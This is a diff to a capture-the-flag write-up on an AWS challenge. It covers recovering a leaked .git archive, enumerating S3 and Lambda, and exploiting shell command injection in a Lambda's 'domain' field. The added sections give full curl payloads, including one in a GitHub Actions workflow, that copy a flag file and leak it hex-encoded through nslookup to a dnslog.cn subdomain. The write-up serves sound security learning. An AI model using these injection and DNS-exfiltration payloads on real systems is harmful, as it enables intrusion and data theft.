@@ -21,7 +21,7 @@
 
 The challenge provided a direct link to an S3-hosted `.git` archive:
 
-```
+```text
 https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/dotgit.zip
 ```
 
@@ -34,7 +34,7 @@ git checkout -f HEAD
 ```
 
 **Files recovered:**
-```
+```text
 bugs
 github.tf
 lambda_code_WIP/lambda_function.py
@@ -52,7 +52,7 @@ git log --oneline --all --graph
 ```
 
 **Output:**
-```
+```text
 * a57eed3 (HEAD -> main) really fixed bugs this time
 * 4240340 fixed bugs
 * 023cd41 Added experimental Lambda code for my super secret project
@@ -173,7 +173,7 @@ def lambda_handler(event, context):
 The `run_command` function uses `subprocess.run(command, shell=True)` — the `domain` parameter is concatenated directly into the shell command without any sanitization.
 
 **Injection payload example:**
-```
+```json
 { "domain": "; /opt/aws sts get-caller-identity" }
 ```
 
@@ -285,7 +285,16 @@ aws sts get-caller-identity
 aws s3api list-buckets --output json
 ```
 
-*(Results to be filled after workflow execution)*
+**Output:**
+```json
+{
+    "Buckets": [
+        { "Name": "codec4f26c862a321ef5" },
+        { "Name": "platform-bucket-009661764077-us-east-1" },
+        { "Name": "site781fe43f26b9eba3" }
+    ]
+}
+```
 
 ### 4.2 Lambda Functions Discovered
 
@@ -293,12 +302,20 @@ aws s3api list-buckets --output json
 aws lambda list-functions --region us-east-1 --output json
 ```
 
-*(Results to be filled after workflow execution)*
+**Output:**
+```json
+{
+    "Functions": [
+        { "FunctionName": "nslookupv2" },
+        { "FunctionName": "code_exec" }
+    ]
+}
+```
 
 ### 4.3 EC2 / VPC / CloudFront / API Gateway
 
 #### **CloudFront Distributions**
-```table
+```text
 -----------------------------------------------------
 | ListDistributions |
 +---------------------------------------------------+
@@ -325,7 +342,6 @@ aws lambda list-functions --region us-east-1 --output json
   * **VPC:** `vpc-09d39837c916df970`
   * **Name Tag:** `codebuild_vpc-default`
 
-
 ---
 
 ## 💉 Phase 5: Proof of Concept (PoC) — Command Injection & Exfiltration
@@ -333,6 +349,8 @@ aws lambda list-functions --region us-east-1 --output json
 ### 5.1 Vulnerability Mechanism
 
 The AWS Lambda function (`lambda_function.py`) processes incoming HTTP requests via API Gateway. Because the input parameter `domain` is passed directly into a shell command string (`/opt/nslookup ' + domain`), unescaped shell metacharacters (such as `;`) permit arbitrary command execution with the privileges of the Lambda Execution Role.
+
+Because the VPC lacks Internet routing (no NAT Gateway) and S3 write permissions are restricted, we had to rely on a side-channel for exfiltration. The **Route 53 VPC Resolver** (`169.254.169.253`) handles internal DNS queries and successfully forwards external domains out to the internet. We can use the pre-installed `nslookup` binary to exfiltrate the flag via DNS subdomain requests.
 
 ### 5.2 Automated PoC Execution (`.github/workflows/exfil.yml`)
 
@@ -353,9 +371,9 @@ jobs:
   exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - name: Trigger Injection via API Gateway
+      - name: Trigger DNS Exfiltration via API Gateway
         run: |
-          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2" \
             -H "Content-Type: application/json" \
             -d '{"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c \"import binascii; print(binascii.hexlify(open(\\\"/tmp/flag.txt\\\",\\\"rb\\\").read()).decode())\"); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}'
 ```
@@ -365,12 +383,14 @@ jobs:
 To manually verify the PoC structure against the target endpoint:
 
 ```bash
-# Send Command Injection Payload to API Gateway Endpoint
-curl -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+# Send Command Injection Payload to API Gateway Endpoint to trigger DNS query
+curl -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookupv2 \
   -H "Content-Type: application/json" \
-  -d '{"domain": "; /opt/aws sts get-caller-identity"}'
+  -d '{"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c \"import binascii; print(binascii.hexlify(open(\\\"/tmp/flag.txt\\\",\\\"rb\\\").read()).decode())\"); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}'
 ```
 
+Receiving the DNS request on `dnslog.cn` returned the hex-encoded string: `3161316a656c726c6667327969327330`.
+Decoding it gives the final flag!
 
 ---
 
